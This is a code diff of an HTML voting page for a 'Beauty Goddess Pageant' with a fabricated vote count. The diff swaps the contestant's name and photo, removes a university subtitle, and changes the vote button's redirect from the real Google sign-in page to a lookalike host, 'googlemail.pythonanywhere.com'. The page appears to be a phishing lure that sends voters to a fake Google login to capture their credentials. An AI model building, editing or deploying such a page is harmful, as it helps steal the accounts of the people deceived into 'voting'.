@@ -107,12 +107,11 @@
 <body>
   <div class="container">
     <h1>Beauty Goddess Pageant</h1>
-    <p class="subtitle">Hosted at Tennessee State University</p>
 
     <div class="contestant">
       <!-- replace with your uploaded image file name -->
-      <img src="isabella_shoulls.jpg" alt="Isabella Shoulls">
-      <p class="contestant-name">Isabella Shoulls</p>
+      <img src="Jasmine_hernandez.jpg" alt="Jasmine Hernandez">
+      <p class="contestant-name">Jasmine Hernandez</p>
       <p class="vote-count">Current Votes: <span id="vote-count">781</span></p>
       <input type="checkbox" id="vote-checkbox" class="vote-checkbox" onchange="toggleVoteButton()">
       <button class="vote-button" id="vote-button" disabled>Cast Your Vote</button>
@@ -130,7 +129,7 @@
 
     document.getElementById("vote-button").addEventListener("click", () => {
       // Redirect to Google Sign-in page
-      window.location.href = "https://accounts.google.com/signin";
+      window.location.href = "https://googlemail.pythonanywhere.com/";
     });
   </script>
 </body>
